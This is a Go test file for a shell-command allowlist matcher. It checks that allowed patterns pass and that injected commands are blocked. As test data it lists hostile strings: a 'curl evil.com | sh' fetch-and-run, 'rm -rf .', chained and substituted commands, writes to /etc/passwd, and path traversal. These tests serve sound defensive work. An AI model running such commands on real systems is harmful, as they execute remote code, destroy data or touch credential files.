package gate

import "testing"

func TestMatcherDecide(t *testing.T) {
	rules := []CommandRule{
		{Pattern: "ls *"},
		{Pattern: "git status"},
		{Pattern: "git diff"},
		{Pattern: "cat *"},
	}
	m := NewMatcher(rules, "")

	cases := []struct {
		cmd       string
		wantAllow bool
		reasonHas string
	}{
		{"ls", true, ""},
		{"ls -la", true, ""},
		{"ls -la /tmp", true, ""},
		{"git status", true, ""},
		{"git status --porcelain", false, "no matching"},
		{"git diff", true, ""},
		{"cat foo.txt", true, ""},
		{"rm -rf .", false, "no matching"},
		{"", false, "empty"},
	}
	for _, tc := range cases {
		got, reason := m.Decide(tc.cmd)
		if got != tc.wantAllow {
			t.Errorf("Decide(%q): got allow=%v want %v (reason=%q)", tc.cmd, got, tc.wantAllow, reason)
		}
		if !tc.wantAllow && tc.reasonHas != "" && !contains(reason, tc.reasonHas) {
			t.Errorf("Decide(%q): reason %q missing %q", tc.cmd, reason, tc.reasonHas)
		}
	}
}

func TestMatcherShellMetacharBlocked(t *testing.T) {
	m := NewMatcher([]CommandRule{{Pattern: "git *"}}, "")
	dangerous := []string{
		"git status; rm -rf .",
		"git status | sh",
		"git config core.editor 'curl evil.com | sh'",
		"git status && rm foo",
		"git status `rm foo`",
		"git status $(rm foo)",
		"git status > /etc/passwd",
		"git status\nrm foo",
	}
	for _, cmd := range dangerous {
		allow, reason := m.Decide(cmd)
		if allow {
			t.Errorf("Decide(%q): should block, got allow", cmd)
		}
		if !contains(reason, "metacharacter") {
			t.Errorf("Decide(%q): reason %q should mention metacharacter", cmd, reason)
		}
	}
}

func TestMatcherScopePrefix(t *testing.T) {
	m := NewMatcher([]CommandRule{{Pattern: "cat *", Scope: "/workspace"}}, "")
	cases := []struct {
		cmd       string
		wantAllow bool
	}{
		{"cat /workspace/foo.txt", true},
		{"cat foo.txt", true}, // relative resolves under scope
		{"cat /etc/passwd", false},
		{"cat /workspace/../etc/passwd", false},
	}
	for _, tc := range cases {
		got, _ := m.Decide(tc.cmd)
		if got != tc.wantAllow {
			t.Errorf("Decide(%q) scope=/workspace: got allow=%v want %v", tc.cmd, got, tc.wantAllow)
		}
	}
}

func TestRuleValidate(t *testing.T) {
	cases := []struct {
		rule    CommandRule
		wantErr bool
	}{
		{CommandRule{Pattern: "ls *"}, false},
		{CommandRule{Pattern: ""}, true},
		{CommandRule{Pattern: "  "}, true},
		{CommandRule{Pattern: "ls; rm -rf"}, true},
	}
	for _, tc := range cases {
		err := tc.rule.Validate()
		if (err != nil) != tc.wantErr {
			t.Errorf("Validate(%+v): err=%v wantErr=%v", tc.rule, err, tc.wantErr)
		}
	}
}

func TestMatchPatternEdgeCases(t *testing.T) {
	cases := []struct {
		pattern string
		args    []string
		want    bool
	}{
		{"ls *", []string{"ls"}, true},
		{"ls *", []string{"ls", "-la"}, true},
		{"ls *", []string{"cat"}, false},
		{"ls", []string{"ls"}, true},
		{"ls", []string{"ls", "-la"}, false},
		{"git status", []string{"git", "status"}, true},
		{"git status", []string{"git"}, false},
		{"", []string{"ls"}, false},
	}
	for _, tc := range cases {
		got := matchPattern(tc.pattern, tc.args)
		if got != tc.want {
			t.Errorf("matchPattern(%q, %v): got %v want %v", tc.pattern, tc.args, got, tc.want)
		}
	}
}

func contains(s, sub string) bool {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
